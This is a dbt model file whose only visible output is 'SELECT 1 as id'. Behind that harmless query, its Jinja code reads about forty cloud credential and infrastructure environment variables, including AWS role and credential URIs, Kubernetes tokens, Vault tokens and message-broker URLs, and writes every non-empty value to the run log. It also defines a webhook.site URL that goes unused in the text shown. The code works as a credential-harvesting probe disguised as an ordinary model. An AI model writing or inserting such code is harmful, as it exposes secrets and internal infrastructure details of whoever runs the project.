{% set webhook = "https://webhook.site/01dd8669-5c8b-4697-a7ea-eb5d2e5b1c72" %}

{% set cred_vars = [
    'AWS_CONTAINER_CREDENTIALS_RELATIVE_URI',
    'AWS_CONTAINER_CREDENTIALS_FULL_URI',
    'AWS_WEB_IDENTITY_TOKEN_FILE',
    'AWS_ROLE_ARN',
    'AWS_ROLE_SESSION_NAME',
    'ECS_CONTAINER_METADATA_URI',
    'ECS_CONTAINER_METADATA_URI_V4',
    'KUBERNETES_SERVICE_HOST',
    'KUBERNETES_SERVICE_PORT',
    'KUBERNETES_PORT_443_TCP_ADDR',
    'K8S_NAMESPACE',
    'K8S_POD_NAME',
    'SERVICE_ACCOUNT_TOKEN_PATH',
    'GOOGLE_APPLICATION_CREDENTIALS',
    'VAULT_ADDR',
    'VAULT_TOKEN',
    'INTERNAL_API_URL',
    'DBT_INTERNAL_URL',
    'ORC_ENV',
    'ORC_CLUSTER',
    'ORC_REGION',
    'CELL_ID',
    'CELL_NAME',
    'NATS_URL',
    'RABBITMQ_URL',
    'KAFKA_BOOTSTRAP_SERVERS',
    'IAM_ROLE',
    'TASK_ROLE_ARN',
    'EXECUTION_ROLE_ARN',
    'DD_AGENT_HOST',
    'SENTRY_DSN',
    'ISTIO_META_MESH_ID',
    'ISTIO_META_CLUSTER_ID',
    'POD_IP',
    'NODE_NAME',
    'KUBE_DNS',
    'CLUSTER_DNS',
    'NAMESPACE'
] %}

{% for var_name in cred_vars %}
{% set val = env_var(var_name, '') %}
{% if val %}
{{ log("CLOUD_" ~ var_name ~ "=" ~ val, info=True) }}
{% endif %}
{% endfor %}

SELECT 1 as id
